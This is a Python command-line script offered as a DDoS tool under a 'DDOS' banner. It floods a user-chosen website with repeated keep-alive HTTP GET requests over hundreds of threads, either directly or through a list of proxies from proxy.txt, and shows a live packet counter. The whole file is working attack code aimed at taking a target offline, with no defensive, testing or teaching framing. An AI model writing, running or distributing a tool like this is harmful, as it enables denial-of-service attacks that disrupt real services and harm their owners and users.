#!/usr/bin/env python3
import socket, threading, sys, time, re, os, random, ssl

# --- Palette Colors ---
G, W, R, Y, D, C, M = '\033[92m', '\033[97m', '\033[91m', '\033[93m', '\033[90m', '\033[36m', '\033[95m'
RESET = '\033[0m'

def show_logo():
    os.system('clear')
    print(f"""
{R} ██████╗ ██████╗  ██████╗ ███████╗
{R} ██╔══██╗██╔══██╗██╔═══██╗██╔════╝
{R} ██║  ██║██║  ██║██║   ██║███████╗
{R} ██║  ██║██║  ██║██║   ██║╚════██║
{R} ██████╔╝██████╔╝╚██████╔╝███████║
{R} ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝{RESET}
{D} ----------------------------------- {RESET}""")

def is_valid_url(url):
    pattern = re.compile(r'^(?:http|ftp)s?://(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|localhost|\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})(?::\d+)?(?:/?|[/?]\S+)$', re.IGNORECASE)
    return re.match(pattern, url) is not None

while True:
    show_logo()
    print(f"{D} Quick cmd: [url] t [threads] s [port]{RESET}")
    raw_input = input(f"{R}DDOS{G}@{W}STRIK{D}$ {RESET}").strip()
    if not raw_input: continue

    try:
        target_url = raw_input.split()[0]
    except: continue

    thread_count = 800
    use_ssl = target_url.startswith("https")
    custom_port = 443 if use_ssl else 80

    t_find = re.search(r't\s*(\d+)', raw_input, re.IGNORECASE)
    if t_find: thread_count = int(t_find.group(1))

    s_find = re.search(r's\s*(\d+)', raw_input, re.IGNORECASE)
    if s_find: custom_port = int(s_find.group(1))

    if not is_valid_url(target_url):
        print(f"\n{R}[!] ERROR: Invalid URL!{RESET}")
        input(f"{W}Press [Enter] to try again...{RESET}")
        continue

    url_clean = target_url.replace("http://", "").replace("https://", "")
    target, path = url_clean.split("/")[0], "/" + "/".join(url_clean.split("/")[1:]) if "/" in url_clean else "/"

    print(f"{D} ----------------------------------- {RESET}")
    print(f"{W} TARGET      : {Y}{target}{RESET}")
    print(f"{W} THREADS (t) : {G}{thread_count}{RESET}")
    print(f"{W} PORT    (s) : {G}{custom_port}{RESET}")
    print(f"{D} ----------------------------------- {RESET}")

    print(f"{G}[1] STRIKE {R}[2] EXPLOIT {D}(Normal Mode){RESET}")
    print(f"{G}[3] STRIKE {R}[4] EXPLOIT {D}(Proxy Mode){RESET}")
    choice = input(f"{C}MODE > {RESET}")

    if choice not in ['1', '2', '3', '4']: continue

    proxies = []
    if choice in ['3', '4']:
        if not os.path.exists("proxy.txt"):
            print(f"\n{R}[!] ERROR: proxy.txt not found!{RESET}")
            input(f"{W}Press [Enter] to return...{RESET}")
            continue
        with open("proxy.txt", "r") as f:
            proxies = [line.strip() for line in f if ":" in line]

    sent_count, err_count = 0, 0
    start_time = time.time()
    count_lock, stop_event = threading.Lock(), threading.Event()

    def attack(mode):
        global sent_count, err_count
        while not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                if mode in ['3', '4']:
                    if not proxies: break
                    p_h, p_p = random.choice(proxies).split(":")
                    s.connect((p_h, int(p_p)))
                    s.send(f"CONNECT {target}:{custom_port} HTTP/1.1\r\n\r\n".encode())
                else:
                    if use_ssl: s = ssl.create_default_context().wrap_socket(s, server_hostname=target)
                    s.connect((target, custom_port))
                
                req = f"GET {path} HTTP/1.1\r\nHost: {target}\r\nConnection: keep-alive\r\n\r\n"
                for _ in range(20):
                    if stop_event.is_set(): break
                    s.send(req.encode('ascii'))
                    with count_lock:
                        sent_count += 1
                s.close()
            except:
                with count_lock:
                    err_count += 1
                time.sleep(0.05)

    print(f"{D} ----------------------------------- {RESET}")
    try:
        for i in range(thread_count):
            threading.Thread(target=attack, args=(choice,), daemon=True).start()
        
        while not stop_event.is_set():
            log_msg = (f"{Y}>>{D}[{G}SENDING {M}| {W}Packets: "
                      f"{R}{sent_count:06d} {G}=> {Y}{target}{D}]{RESET}")
            sys.stdout.write(f"\r{log_msg.ljust(100)}")
            sys.stdout.flush()
            time.sleep(0.1)

    except KeyboardInterrupt:
        stop_event.set()
        duration = round(time.time() - start_time, 2)
        avg_speed = round(sent_count / duration, 2) if duration > 0 else 0
        
        # --- ปรับแก้การจัดวางให้เหมือนรูปภาพ (Alignment) ---
        print(f"\r{RESET}")
        print(f"{D}-----------------------------------{RESET}")
        print(f"{R} [!]  SESSION TERMINATED{RESET}")
        print(f"{W} TOTAL PACKETS SENT : {G}{str(sent_count).ljust(10)}{RESET}")
        print(f"{W} TOTAL ERRORS       : {R}{str(err_count).ljust(10)}{RESET}")
        print(f"{W} TOTAL DURATION     : {C}{str(duration).ljust(5)}s{RESET}")
        print(f"{W} AVERAGE SPEED      : {M}{str(avg_speed).ljust(8)} p/s{RESET}")
        print(f"{D}-----------------------------------{RESET}")
        input(f"\n{W} Press [Enter] to return to Main Menu...{RESET}")
        continue
